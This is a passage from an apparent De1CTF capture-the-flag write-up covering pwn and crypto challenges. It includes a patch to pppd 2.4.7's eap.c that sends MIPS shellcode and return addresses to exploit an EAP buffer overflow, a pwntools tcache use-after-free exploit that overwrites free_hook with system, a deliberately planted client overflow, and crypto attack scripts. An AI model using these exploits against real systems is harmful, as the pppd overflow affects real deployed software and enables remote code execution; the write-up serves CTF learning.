重新打包一个cpio，启动</p><p>进入系统后默认得到一个shell，系统里面自带一个socat</p><p>执行 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socat pty,link=/dev/serial,raw tcp-listen:9999 &amp;</span><br><span class="line">/pppd /dev/serial 9600 local lock defaultroute 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100</span><br></pre></td></tr></table></figure></p><p>之后执行下面的命令获取pppd的pid <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps |grep pppd</span><br></pre></td></tr></table></figure></p><p>使用gdbserver attach上pppd <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gdbserver --attach 0.0.0.0:4242 pid</span><br></pre></td></tr></table></figure></p><p>然后在外面使用gdb-multiarch去连接gdbserver</p><p>之后下载一个pppd的源码，编译 执行 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socat pty,link=/tmp/serial,rawer tcp:127.0.0.1:9999 &amp;</span><br><span class="line">pppd noauth local lock defaultroute debug nodetach /tmp/serial 9600 user notadmin password notpassword</span><br></pre></td></tr></table></figure></p><p>这样就成功进行调试了</p><p>之后根据https://gist.github.com/nstarke/551433bcc72ff95588e168a0bb666124 的操作patch源码，写exp即可</p><p>exp patch如下 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">--- ppp-ppp-2.4.7/pppd/eap.c    2014-08-09 12:31:39.000000000 +0000</span><br><span class="line">+++ ppp-poc/ppp-ppp-2.4.7/pppd/eap.c    2020-04-12 03:23:54.321773453 +0000</span><br><span class="line">@@ -1385,8 +1385,46 @@</span><br><span class="line">             esp-&gt;es_usedpseudo = 2;</span><br><span class="line">         &#125;</span><br><span class="line"> #endif /* USE_SRP */</span><br><span class="line">-        eap_send_response(esp, id, typenum, esp-&gt;es_client.ea_name,</span><br><span class="line">-            esp-&gt;es_client.ea_namelen);</span><br><span class="line">+        //eap_send_response(esp, id, typenum, esp-&gt;es_client.ea_name,</span><br><span class="line">+        //    esp-&gt;es_client.ea_namelen);</span><br><span class="line">+#define PAY_LEN 256</span><br><span class="line">+        char sc[PAY_LEN];</span><br><span class="line">+        memset(sc, &apos;C&apos;, PAY_LEN);</span><br><span class="line">+        int* shellcode = (int*)sc;</span><br><span class="line">+        shellcode[0]=0x3c09616c;</span><br><span class="line">+        shellcode[1]=0x3529662f;</span><br><span class="line">+        shellcode[2]=0xafa9fff8;</span><br><span class="line">+        shellcode[3]=0x2419ff98;</span><br><span class="line">+        shellcode[4]=0x3204827;</span><br><span class="line">+        shellcode[5]=0xafa9fffc;</span><br><span class="line">+        shellcode[6]=0x27bdfff8;</span><br><span class="line">+        shellcode[7]=0x3a02020;</span><br><span class="line">+        shellcode[8]=0x2805ffff;</span><br><span class="line">+        shellcode[9]=0x2806ffff;</span><br><span class="line">+        shellcode[10]=0x34020fa5;</span><br><span class="line">+        shellcode[11]=0x101010c;</span><br><span class="line">+        shellcode[12]=0xafa2fffc;</span><br><span class="line">+        shellcode[13]=0x8fa4fffc;</span><br><span class="line">+        shellcode[14]=0x3c19ffb5;</span><br><span class="line">+        shellcode[15]=0x3739c7fd;</span><br><span class="line">+        shellcode[16]=0x3202827;</span><br><span class="line">+        shellcode[17]=0x3c190101;</span><br><span class="line">+        shellcode[18]=0x373901fe;</span><br><span class="line">+        shellcode[19]=0x3c060101;</span><br><span class="line">+        shellcode[20]=0x34c60101;</span><br><span class="line">+        shellcode[21]=0x3263026;</span><br><span class="line">+        shellcode[22]=0x34020fa3;</span><br><span class="line">+        shellcode[23]=0x101010c;</span><br><span class="line">+        shellcode[24]=0x3c05004a;</span><br><span class="line">+        shellcode[25]=0x34a53800;</span><br><span class="line">+        shellcode[26]=0x20460002;</span><br><span class="line">+        shellcode[27]=0x3c190042;</span><br><span class="line">+        shellcode[28]=0x37396698;</span><br><span class="line">+        shellcode[29]=0x320f809;</span><br><span class="line">+        shellcode[30]=0x0;</span><br><span class="line">+        sc[PAY_LEN-1] = &apos;\0&apos;;</span><br><span class="line">+</span><br><span class="line">+        eap_send_response(esp, id, typenum, shellcode, PAY_LEN);</span><br><span class="line">         break;</span><br><span class="line"></span><br><span class="line">     case EAPT_NOTIFICATION:</span><br><span class="line">@@ -1452,8 +1490,21 @@</span><br><span class="line">         BZERO(secret, sizeof (secret));</span><br><span class="line">         MD5_Update(&amp;mdContext, inp, vallen);</span><br><span class="line">         MD5_Final(hash, &amp;mdContext);</span><br><span class="line">-        eap_chap_response(esp, id, hash, esp-&gt;es_client.ea_name,</span><br><span class="line">-            esp-&gt;es_client.ea_namelen);</span><br><span class="line">+        //eap_chap_response(esp, id, hash, esp-&gt;es_client.ea_name,</span><br><span class="line">+        //    esp-&gt;es_client.ea_namelen);</span><br><span class="line">+        char payload[1024];</span><br><span class="line">+                memset(payload, &apos;A&apos;, 1023);</span><br><span class="line">+                memset(payload, &apos;B&apos;, 0x2a0);</span><br><span class="line">+        int *tpayload = (int*)(payload + 0x2a0 - 4);</span><br><span class="line">+        //*tpayload = 0x040A0BC;</span><br><span class="line">+        *tpayload = 0x4083FC;</span><br><span class="line">+        //*(tpayload-1) = 0x043EF9C;</span><br><span class="line">+        *(tpayload-1) = 0x43EF9C;</span><br><span class="line">+        *(tpayload-5) = 0x4a7a0c-8;</span><br><span class="line">+</span><br><span class="line">+                payload [1023] = &apos;\0&apos;;</span><br><span class="line">+                eap_chap_response(esp, id, hash, payload, 1024);</span><br><span class="line">+        exit(0);</span><br><span class="line">         break;</span><br><span class="line"></span><br><span class="line"> #ifdef USE_SRP</span><br></pre></td></tr></table></figure></p><h2><span id="stl_container">stl_container</span></h2><p>这道题是关于c++ vector模板的一个漏洞 当vector中储存的是Object的时候，erase指定下标的Object都会调用vector中最后一个Object的析构函数 这样就有了一个UAF漏洞，接下来就利用tcache进行各种攻击</p><p>下面是exp <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">debug=0</span><br><span class="line"></span><br><span class="line">#context.terminal = [&apos;tmux&apos;,&apos;-x&apos;,&apos;sh&apos;,&apos;-c&apos;]</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos; ]</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">    p=process(&apos;./stl_container&apos;)</span><br><span class="line">    #p=process(&apos;&apos;,env=&#123;&apos;LD_PRELOAD&apos;:&apos;./libc.so&apos;&#125;)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">else:</span><br><span class="line">    p=remote(&apos;134.175.239.26&apos;,8848)</span><br><span class="line"></span><br><span class="line">def ru(x):</span><br><span class="line">    return p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">def se(x):</span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line">def sl(x):</span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line">def add(ty, content=&apos;a&apos;):</span><br><span class="line">    sl(str(ty))</span><br><span class="line">    ru(&apos;3. show&apos;)</span><br><span class="line">    ru(&apos;&gt;&gt;&apos;)</span><br><span class="line">    sl(&apos;1&apos;)</span><br><span class="line">    ru(&apos;input data:&apos;)</span><br><span class="line">    se(content)</span><br><span class="line">    ru(&apos;&gt;&gt;&apos;)</span><br><span class="line"></span><br><span class="line">def delete(ty, idx=0):</span><br><span class="line">    sl(str(ty))</span><br><span class="line">    ru(&apos;3. show&apos;)</span><br><span class="line">    ru(&apos;&gt;&gt;&apos;)</span><br><span class="line">    sl(&apos;2&apos;)</span><br><span class="line">    if ty &lt;= 2:</span><br><span class="line">        ru(&apos;index?&apos;)</span><br><span class="line">        sl(str(idx))</span><br><span class="line">    ru(&apos;&gt;&gt;&apos;)</span><br><span class="line"></span><br><span class="line">def show(ty, idx=0):</span><br><span class="line">    sl(str(ty))</span><br><span class="line">    ru(&apos;3. show&apos;)</span><br><span class="line">    ru(&apos;&gt;&gt;&apos;)</span><br><span class="line">    sl(&apos;3&apos;)</span><br><span class="line">    ru(&apos;index?\n&apos;)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(&apos;data: &apos;)</span><br><span class="line">    data = ru(&apos;\n&apos;)</span><br><span class="line">    ru(&apos;&gt;&gt;&apos;)</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(&apos;&gt;&gt;&apos;)</span><br><span class="line"></span><br><span class="line">add(1)</span><br><span class="line">add(1)</span><br><span class="line">add(2)</span><br><span class="line">add(2)</span><br><span class="line">add(4)</span><br><span class="line">add(4)</span><br><span class="line">add(3)</span><br><span class="line">add(3)</span><br><span class="line"></span><br><span class="line">delete(3)</span><br><span class="line">delete(3)</span><br><span class="line">delete(1)</span><br><span class="line">delete(1)</span><br><span class="line">delete(4)</span><br><span class="line">delete(4)</span><br><span class="line">delete(2)</span><br><span class="line">data = show(2)</span><br><span class="line">libc = u64(data[:6]+&apos;\0\0&apos;)</span><br><span class="line">base = libc - 0x3ebca0</span><br><span class="line">free_hook = base + 0x3ed8e8</span><br><span class="line">system = base + 0x4f440</span><br><span class="line"></span><br><span class="line">add(3, &apos;/bin/sh\0&apos;)</span><br><span class="line">delete(2)</span><br><span class="line">add(4)</span><br><span class="line">add(2)</span><br><span class="line">add(2)</span><br><span class="line">add(3, &apos;/bin/sh\0&apos;)</span><br><span class="line">delete(2)</span><br><span class="line">delete(2)</span><br><span class="line">add(1, p64(free_hook))</span><br><span class="line">add(1, p64(system))</span><br><span class="line"></span><br><span class="line">sl(&apos;3&apos;)</span><br><span class="line">ru(&apos;show&apos;)</span><br><span class="line">sl(&apos;2&apos;)</span><br><span class="line"></span><br><span class="line">print(hex(base))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h2><span id="mc_realworld">mc_realworld</span></h2><p>文件列表： <a href="https://pastebin.com/FrVCXW42" target="_blank" rel="noopener">exp.py</a> <a href="https://pastebin.com/t37qDEYw" target="_blank" rel="noopener">requirements.txt</a></p><p>出题人继续挖与mc相关的材料。找到了这个 <a href="https://github.com/fogleman/Craft" target="_blank" rel="noopener">fogleman/Craft</a> 。</p><p>游戏还蛮好的，服务端用 python 写，pwn 服务端有点难下手，而且搅屎情况更不好控制，所以打算从客户端处下手。在客户端处，埋下一个简单的 bof，在用户聊天时触发。为了防止选手集体挨打，所以限制了@特定用户时才能触发。</p><p>client to client的pwn题变得有趣多了，像极了A&amp;D模式。</p><p>回传flag成为一个问题，中间隔着一个server。预设解法是通过聊天功能回传，只能@自己，因为公屏黑名单了关键词 <code>De1CTF</code>，防止 flag 意外泄露。</p><p>非预期回传方式，参考上面 <code>mc_logclient</code> wp 的说明。</p><p>漏洞点位于客户端 <code>add_messages</code> 函数。你可以通过 <code>bindiff</code> 找到它（需要保证编译环境一致，编译器flags一致）。代码大概如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if (text[0] == &apos;@&apos; &amp;&amp; strlen(text) &gt; 192) &#123;</span><br><span class="line">    text = text + 1;</span><br><span class="line">    char *body = text + 32;</span><br><span class="line">    size_t length;</span><br><span class="line">    char *plain = base64_decode(body, strlen(body), &amp;length);</span><br><span class="line">    char message[16] = &#123;0&#125;;</span><br><span class="line">    memcpy(&amp;message, plain, length);</span><br><span class="line">    printf(&quot;%8s&quot;, &amp;message);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显，简单 bof。</p><p>更多细节详见：exp.py。</p><p><code>De1CTF{W3_L0vE_D4nge2_ReA1_W0r1d1_CrAft!2233}</code></p><h1><span id="crypto">crypto</span></h1><h2><span id="nlfsr">NLFSR</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(r, m)</span>:</span> <span class="keyword">return</span> ((r &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span>) ^ (bin(r &amp; m).count(<span class="string">'1'</span>) % <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ma, mb, mc, md = <span class="number">0x505a1</span>, <span class="number">0x40f3f</span>, <span class="number">0x1f02</span>, <span class="number">0x31</span></span><br><span class="line">key = open(<span class="string">"data"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcR</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(x) == len(y)</span><br><span class="line">    cnt = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> zip(x, y):</span><br><span class="line">        cnt += (i == j)</span><br><span class="line">    <span class="keyword">return</span> cnt/len(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brutea</span><span class="params">(nb)</span>:</span></span><br><span class="line">    relation, reala = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">18</span>+<span class="number">1</span>, <span class="number">2</span>**<span class="number">19</span>):</span><br><span class="line">        s = <span class="string">''</span></span><br><span class="line">        a = i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(nb*<span class="number">8</span>):</span><br><span class="line">            a = lfsr(a, ma)</span><br><span class="line">            s += str(a &amp; <span class="number">1</span>)</span><br><span class="line">        r = calcR(s, key[:nb*<span class="number">8</span>])</span><br><span class="line">        <span class="keyword">if</span> relation &lt; r:</span><br><span class="line">            relation, reala = r, i</span><br><span class="line">    print(reala, relation)</span><br><span class="line">    <span class="keyword">return</span> reala</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brutecd</span><span class="params">(nb)</span>:</span></span><br><span class="line">    relation, realc, reald = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">5</span>+<span class="number">1</span>, <span class="number">2</span>**<span class="number">6</span>):</span><br><span class="line">        d = i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">12</span>+<span class="number">1</span>, <span class="number">2</span>**<span class="number">13</span>):</span><br><span class="line">            c = j</span><br><span class="line">            s = <span class="string">''</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(nb*<span class="number">8</span>):</span><br><span class="line">                c = lfsr(c, mc)</span><br><span class="line">                d = lfsr(d, md)</span><br><span class="line">                s += str((c &amp; <span class="number">1</span>) ^ (d &amp; <span class="number">1</span>))</span><br><span class="line">            r = calcR(s, key[:nb*<span class="number">8</span>])</span><br><span class="line">            <span class="keyword">if</span> relation &lt; r:</span><br><span class="line">                relation, realc, reald = r, j, i</span><br><span class="line">    print(realc, reald, relation)</span><br><span class="line">    <span class="keyword">return</span> realc, reald</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruteb</span><span class="params">(nb, a_, c_, d_)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">18</span>+<span class="number">1</span>, <span class="number">2</span>**<span class="number">19</span>):</span><br><span class="line">        b = i</span><br><span class="line">        a, c, d = a_, c_, d_</span><br><span class="line">        s = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(nb*<span class="number">8</span>):</span><br><span class="line">            a = lfsr(a, ma)</span><br><span class="line">            b = lfsr(b, mb)</span><br><span class="line">            c = lfsr(c, mc)</span><br><span class="line">            d = lfsr(d, md)</span><br><span class="line">            [ao, bo, co, do] = [k &amp; <span class="number">1</span> <span class="keyword">for</span> k <span class="keyword">in</span> [a, b, c, d]]</span><br><span class="line">            s += str((ao*bo) ^ (bo*co) ^ (bo*do) ^ co ^ do)</span><br><span class="line">        <span class="keyword">if</span> s == key[:nb*<span class="number">8</span>]:</span><br><span class="line">            print(i)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">print</span> time.asctime()</span><br><span class="line">    a = brutea(<span class="number">15</span>)</span><br><span class="line">    <span class="keyword">print</span> time.asctime()</span><br><span class="line">    c, d = brutecd(<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">print</span> time.asctime()</span><br><span class="line">    b = bruteb(<span class="number">15</span>, a, c, d)</span><br><span class="line">    <span class="keyword">print</span> time.asctime()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"De1CTF&#123;%s&#125;"</span> % (<span class="string">''</span>.join([hex(i)[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c, d]]))</span><br><span class="line">  </span><br><span class="line"><span class="comment">#De1CTF&#123;58bb578d5611363f&#125;</span></span><br></pre></td></tr></table></figure><h2><span id="easyrsa">easyRSA</span></h2><p>This is a common modules attack but when the task is about end someone tell me that this challenge is same as the challenge in D^3CTF <a href="https://github.com/D-3CTF/D3CTF-2019-Challenges" target="_blank" rel="noopener">Common</a>. Last year I didn't look at the crypto challenge in this task. So I want to make a sincere apology to the person, <a href="https://gist.github.com/LurkNoi" target="_blank" rel="noopener">Lurkrul</a> ,who made the challenge. Sorry about this.</p><p>And here is the solution:</p><p>In this a RSA task. We can find out that the e has been generated by this way: <span class="math display">\[e_1d_1 = 1 + k_1\lambda(N)\]</span></p><p><span class="math display">\[e_2d_2 = 1 + k_2\lambda(N)\]</span></p><p>And there are some limits: <span class="math display">\[limit = \sqrt[3]{N}\]</span></p><p><span class="math display">\[limit &lt; r &lt; 0x1000000000001 * limit\]</span></p><p><span class="math display">\[d_i = nextPrime(r)\]</span></p><p><span class="math display">\[e_i \approx N\]</span></p><p>We choose a random <span class="math inline">\(e\)</span> in <span class="math inline">\([e_1\)</span> , <span class="math inline">\(e_2]\)</span> to encrypt flag, <span class="math display">\[flag^{e} \equiv cipher \pmod n\]</span> And give these parameters: <span class="math display">\[N,e1,e2,cipher\]</span> In this task, we can get some equation: <span class="math display">\[e_id_i = 1 + k_i \lambda(N) = 1 + \frac {k_i}{g} \Phi(N) = 1 + \frac {k_i}{g} (N-s)\]</span> And we rewrite it as: <span class="math display">\[W_i: e_id_ig - k_iN = g - k_is\]</span> This equation is the starting point for Wiener's attack.</p><p>Also we can get this easily: <span class="math display">\[G_{i,j}: k_ie_jd_j - k_je_id_i = k_i - k_j\]</span> This equation is the starting point for Guo's common modulus attack.</p><p>Then we assume: <span class="math display">\[k_2W_1: k_2e_1d_1g - k_2k_1N = k_2(g-k_1s)\]</span></p><p><span class="math display">\[gG_{1,2} : k_1e_2d_2g - k_2e_1d_1g = g(k_1-k_2)\]</span></p><p><span class="math display">\[W_1W_2 : d_1d_2g^2e_1e_2 - d_1k_2ge_1N - d_2k_1ge_2N + k_1k_2N^2 = (g-k_1s)(g-k_2s)\]</span></p><p>Along with the trivial equation: <span class="math display">\[k1k2 = k2k1\]</span> can be written as the vector-matrix equation: <span class="math display">\[x_2B_2 = v_2\]</span> where: <span class="math display">\[x_2 = (k_1k_2,k_2d_1g,k_1d_2g,d_1d_2g^2)\]</span></p><p><span class="math display">\[B_2 = \begin{bmatrix}1 &amp; -N &amp; 0 &amp; N^2 \\  &amp; e_1 &amp; - e_1 &amp; -e_1N\\ &amp; &amp; e_2 &amp; -e_2N \\ &amp; &amp; &amp; e_1e_2\end{bmatrix}\]</span></p><p><span class="math display">\[v_2 = (k_1k_2,k_2(g-k_1s),g(k_1-k_2),(g-k_1s)(g-k_2s))\]</span></p><p>The vector <span class="math inline">\(v_2\)</span> is an integer linear combination of the rows in <span class="math inline">\(B_2\)</span>, and is therefore a vector in the lattice <span class="math inline">\(L_2\)</span>generated by the rows of <span class="math inline">\(B_2\)</span>.</p><p>And the size of <span class="math inline">\(v_2\)</span>, coming from the dominant last component, is roughly <span class="math display">\[k_1k_2s^2 \approx N^{2\delta_2+1} = N^{2(\delta_2+1/2)}\]</span></p><p><span class="math display">\[\delta_2 = 0.357 - \epsilon \ , \ \epsilon \ is \ small\]</span></p><p>Since the components of <span class="math inline">\(v_2\)</span> are not the same size, we can consider the modified vector-matrix equation: <span class="math display">\[x_2B_2D_2 = v_2D_2\]</span> Where <span class="math inline">\(D_2\)</span> is the diagonal matrix: <span class="math display">\[D_2 = \begin{bmatrix}N &amp;  &amp;  &amp;  \\  &amp;  N^{(1/2)} &amp; &amp; \\ &amp; &amp; N^{1+\delta_2} &amp;  \\ &amp; &amp; &amp; 1\end{bmatrix}\]</span> Letting: <span class="math display">\[v^{&#39;}_2 = v_2D_2\]</span> Thus: <span class="math display">\[v^{&#39;}_2 = (k_1k_2N,k2(g-k_1s)N^{(1/2)},g(k_1-k_2)N^{1+\delta_2},(g-k_1s)(g-k_2s))\]</span> We can use LLL to get <span class="math inline">\(v^{&#39;}_2\)</span> and solve:<br><span class="math display">\[x_2B_2D_2 = v^{&#39;}_2\]</span> to get <span class="math inline">\(x_2\)</span></p><p>Finally we can get <span class="math inline">\(\Phi(N)\)</span> by: <span class="math display">\[\Phi(N) = \lfloor {e_1 \frac {x_2[2]}{x_2[1]}}\rfloor\]</span> So we can decrypt the cipher to get flag !</p><p>If you want to know more details about this attack, take a look at this <a href="https://sci-hub.tw/https://link.springer.com/chapter/10.1007/3-540-46701-7_14" target="_blank" rel="noopener">paper</a>.</p><p>Reference:</p><p>https://sci-hub.tw/https://link.springer.com/chapter/10.1007/3-540-46701-7_14</p><p>https://eprint.iacr.org/2009/037.pdf</p><h2><span id="ecdh">ECDH</span></h2><p>In this task we can see a <a href="%5Bhttps://en.wikipedia.org/wiki/Elliptic-curve_Diffie%E2%80%93Hellman%5D(https://en.wikipedia.org/wiki/Elliptic-curve_Diffie–Hellman)">ECDH</a> system. We can exchange keys and encrypt message to get result. So we can get the exchanged keys by encrypting our message. Also there is a backdoor, if you give server the secret, the server will give you flag.</p><p>But the task doesn't check whether the given point is on curve. So we can us <a href="https://web-in-security.blogspot.com/2015/09/practical-invalid-curve-attacks.html" target="_blank" rel="noopener">Invalid curve attack</a> to get secret.</p><p>We can construct points not on the given curve with low order by using open source software such as <a href="https://github.com/J08nY/ecgen" target="_blank" rel="noopener">ecgen</a> or <a href="https://crypto.stackexchange.com/questions/71065/invalid-curve-attack-finding-low-order-points" target="_blank" rel="noopener">Invalid curve attack algorithm</a> and use CRT to get secret. Then we can use the generated data to attack the task and get flag.</p><p>PS: use <em>genData.py</em> to generated <em>data.txt</em> locally and use <span class="math inline">\(exp.py\)</span> to attack this chanllenge.</p><p>Reference:</p><p><a href="https://en.wikipedia.org/wiki/Elliptic-curve_Diffie–Hellman" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Elliptic-curve_Diffie%E2%80%93Hellman</a></p><p>https://crypto.stackexchange.com/questions/71065/invalid-curve-attack-finding-low-order-points</p><p>https://web-in-security.blogspot.com/2015/09/practical-invalid-curve-attacks.html</p><p>https://www.iacr.org/archive/pkc2003/25670211/25670211.pdf</p><p>https://github.com/J08nY/ecgen</p><h2><span id="homomorphic">Homomorphic</span></h2><p>This is a homomorphic encryption crypto system. We can use CCA to leak secret key and attack it.</p><p>Here is the solution:</p><ol type="1"><li><p>Let : <span class="math inline">\(M = \delta/4 + 